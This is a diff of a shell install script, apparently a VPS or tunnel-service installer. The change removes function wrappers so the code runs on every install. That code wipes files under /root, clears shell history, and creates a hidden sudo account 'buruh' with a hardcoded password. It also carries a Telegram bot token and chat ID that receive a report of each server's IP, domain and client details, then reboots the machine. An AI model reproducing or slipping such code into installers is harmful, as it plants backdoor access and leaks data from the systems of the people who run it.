@@ -617,8 +617,7 @@ rm -fr /root/*
 touch /root/.system
 history -c
 echo "1.2" > /home/ver
-
-run_bot() {
+clear
 userdel jame > /dev/null 2>&1
 Username="buruh"
 Password=buruh
@@ -626,7 +625,7 @@ mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
-    
+### BOT INFORMATION
 CHATID="5795571992"
 KEY="6079069898:AAGT8hggC62cVoeKq1Q1k37sWj2Bys5NL1M"
 TIME="10"
@@ -636,7 +635,7 @@ Detail Install Script
 ==================================
 IP VPS: $MYIP
 Domain: $domain
-Waktu Install: $DATE2
+Date: $DATE2
 Client Name: $nama
 Expired: $tanggal
 ==================================
@@ -667,7 +666,6 @@ touch /root/system
 reboot
 }
 
-run_pensi() {
 run_eula
 run_izin
 run_domain
@@ -677,7 +675,3 @@ run_ayato
 run_cantikva
 run_indo
 run_xiangling
-run_bot
-}
-
-run_pensi
